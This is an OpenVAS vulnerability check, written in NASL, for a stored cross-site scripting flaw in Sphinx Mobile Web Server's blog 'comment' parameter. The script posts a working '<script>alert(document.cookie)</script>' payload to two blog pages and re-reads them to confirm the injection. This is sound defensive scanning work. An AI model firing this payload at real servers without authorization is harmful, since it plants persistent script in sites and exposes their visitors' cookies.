###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sphinx_mws_comment_mult_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Sphinx Mobile Web Server 'comment' Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Sphinx Mobile Web Server U3 3.1.2.47 and prior.";
tag_insight = "The flaws are due to an improper validation of user-supplied input via
  the 'comment' parameter to '/Blog/MyFirstBlog.txt' and
  '/Blog/AboutSomething.txt', which allows attacker to execute arbitrary HTML
  and script code on the user's browser session in the security context of an
  affected site.";
tag_solution = "No solution or patch is available as of 17th February, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.sphinx-soft.com/MWS/index.html";
tag_summary = "The host is running Sphinx Mobile Web Server and is prone to
  persistent cross site scripting vulnerability.";

if(description)
{
  script_id(802390);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-1005");
  script_bugtraq_id(51820);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-02-02 14:49:35 +0530 (Thu, 02 Feb 2012)");
  script_name("Sphinx Mobile Web Server 'comment' Multiple Cross-Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=453");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47876");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/72913");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18451/");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SecPod_SPHINX_SOFT_Mobile_Web_Server_Mul_Persistence_XSS_Vulns.txt");

  script_description(desc);
  script_summary("Check if Sphinx Mobile Web Server is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
sndReq = "";
banner = "";
mwsPort = 0;

## Get HTTP port
mwsPort = get_http_port(default:8080);
if(!mwsPort){
  exit(0);
}

## Get Banner And Confirm Application
banner = get_http_banner(port: mwsPort);
if("Server: MobileWebServer/" >!< banner){
  exit(0);
}

## Stored XSS (Not a safe check)
if(safe_checks()){
  exit(0);
}

## Make list of vulnerable pages
pages = make_list("/MyFirstBlog.txt", "/AboutSomething.txt");

foreach page (pages)
{
  ##Construct an Exploit
  url1 = "/Blog" + page + "?comment=<script>alert(document.cookie)" +
                          "</script>&submit=Add+Comment";

  ## Send XSS attack
  sndReq = http_get(item: url1, port:mwsPort);
  http_send_recv(port:mwsPort, data:sndReq);

  ##Confirm the Attack by reopening the vulnerable page
  url2 = "/Blog" + page ;

  if(http_vuln_check(port:mwsPort, url:url2, pattern:"<script>alert" +
                           "\(document.cookie\)</script>"))
  {
    security_warning(mwsPort);
    exit(0);
  }
}
